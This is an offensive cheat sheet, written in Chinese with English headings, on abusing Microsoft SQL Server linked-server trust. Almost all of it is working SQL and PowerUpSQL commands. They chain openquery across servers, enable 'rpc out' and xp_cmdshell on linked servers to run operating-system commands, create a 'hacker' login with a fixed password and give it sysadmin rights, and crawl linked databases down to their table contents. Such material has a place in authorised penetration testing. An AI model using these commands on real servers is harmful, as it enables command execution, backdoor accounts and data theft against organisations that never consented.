# MSSQL - 链接数据库 (Linked Database)

## 目录 (Summary)

- [发现受信链接 (Find Trusted Link)](#find-trusted-link)
- [通过链接执行查询 (Execute Query Through The Link)](#execute-query-through-the-link)
- [爬取域内实例的链接 (Crawl Links for Instances in the Domain)](#crawl-links-for-instances-in-the-domain)
- [爬取特定实例的链接 (Crawl Links for a Specific Instance)](#crawl-links-for-a-specific-instance)
- [查询链接数据库的版本 (Query Version of Linked Database)](#query-version-of-linked-database)
- [在链接数据库上执行存储过程 (Execute Procedure on Linked Database)](#execute-procedure-on-linked-database)
- [确定链接数据库的名称 (Determine Names of Linked Databases)](#determine-names-of-linked-databases)
- [通过选定的链接数据库确定所有表名 (Determine All the Tables Names from a Selected Linked Database)](#determine-all-the-tables-names-from-a-selected-linked-database)
- [从选定的链接表中收集前 5 列 (Gather the Top 5 Columns from a Selected Linked Table)](#gather-the-top-5-columns-from-a-selected-linked-table)
- [从选定的链接列中收集条目 (Gather entries from a Selected Linked Column)](#gather-entries-from-a-selected-linked-column)

## 发现受信链接 (Find Trusted Link)

```sql
select * from master..sysservers
```

## 通过链接执行查询 (Execute Query Through The Link)

```sql
-- 通过链接执行查询
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- 链式调用多个 openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- 为 xp_cmdshell 启用 rpc out
EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';
EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');

-- 执行 shell 命令
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- 创建用户并赋予管理员权限
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## 爬取域内实例的链接 (Crawl Links for Instances in the Domain)

有效的链接将在结果的 DatabaseLinkName 字段中标识。

```ps1
Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
select * from master..sysservers
```

## 爬取特定实例的链接 (Crawl Links for a Specific Instance)

```ps1
Get-SQLServerLinkCrawl -Instance "<DBSERVERNAME\DBInstance>" -Verbose
select * from openquery("<instance>",'select * from openquery("<instance2>",''select * from master..sysservers'')')
```

## 查询链接数据库的版本 (Query Version of Linked Database)

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DBSERVERNAME\DBInstance>`",'select @@version')" -Verbose
```

## 在链接数据库上执行存储过程 (Execute Procedure on Linked Database)

```ps1
SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
```

## 确定链接数据库的名称 (Determine Names of Linked Databases)

> tempdb, model 和 msdb 是默认数据库，通常不值得深入查看。Master 也是默认数据库，但可能包含一些信息，而除此之外的其他数据库都是自定义的，绝对值得挖掘。结果是 DatabaseName，它将作为后续查询的输入。

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from sys.databases')" -Verbose
```

## 通过选定的链接数据库确定所有表名 (Determine All the Tables Names from a Selected Linked Database)

> 结果是 TableName，它将作为后续查询的输入。

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from <DatabaseNameFromPreviousCommand>.sys.tables')" -Verbose
```

## 从选定的链接表中收集前 5 列 (Gather the Top 5 Columns from a Selected Linked Table)

> 结果是 ColumnName 和 ColumnValue，它们将作为后续查询的输入。

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select TOP 5 * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand>')" -Verbose
```

## 从选定的链接列中收集条目 (Gather Entries from a Selected Linked Column)

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`"'select * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand> where <ColumnNameFromPreviousCommand>=<ColumnValueFromPreviousCommand>')" -Verbose
```
